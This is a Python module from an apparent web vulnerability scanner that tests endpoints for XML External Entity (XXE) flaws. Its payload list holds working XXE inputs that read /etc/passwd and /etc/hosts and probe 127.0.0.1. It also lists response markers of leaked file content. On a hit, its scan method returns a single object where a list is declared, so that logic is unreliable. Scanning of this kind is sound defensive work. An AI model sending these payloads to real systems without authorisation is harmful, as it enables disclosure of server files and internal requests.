"""
XXE (XML External Entity) Scanner
"""
import re
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity
from ..http.client import Response


class XXEScanner(BaseScanner):
    """XXE vulnerability scanner"""
    
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><data>&xxe;</data>',
    ]
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "POST", **kwargs) -> List[Vulnerability]:
        """Scan for XXE vulnerabilities"""
        vulnerabilities = []
        
        # XXE is typically in POST requests with XML content
        if method.upper() != "POST":
            return vulnerabilities
        
        # Check if endpoint accepts XML
        try:
            test_resp = await self.http_client.post(url, data="<test></test>", headers={"Content-Type": "application/xml"})
            if test_resp.status_code not in [200, 201, 400, 415]:
                return vulnerabilities  # Doesn't accept XML
        except:
            return vulnerabilities
        
        for payload in self.XXE_PAYLOADS:
            try:
                resp = await self.http_client.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/xml"}
                )
                
                # Check for XXE indicators
                if self._check_xxe_response(resp, payload):
                    return self._create_vulnerability(
                        name="XML External Entity (XXE)",
                        severity=Severity.HIGH,
                        url=url,
                        payload=payload[:100],
                        description="XXE vulnerability detected",
                        evidence="Response contains file content or external entity data",
                        recommendation="Disable external entity processing in XML parsers",
                        cwe="CWE-611"
                    )
            except:
                continue
        
        return vulnerabilities
    
    def _check_xxe_response(self, response: Response, payload: str) -> bool:
        """Check if response indicates XXE"""
        # Check for file content
        file_indicators = [
            "root:x:", "daemon:x:", "[boot loader]",
            "for 16-bit app support",
        ]
        
        if any(indicator in response.text for indicator in file_indicators):
            return True
        
        # Check for external entity content
        if "file://" in payload or "http://" in payload:
            # Response should contain content from external entity
            if len(response.text) > 100:  # Significant content
                return True
        
        return False

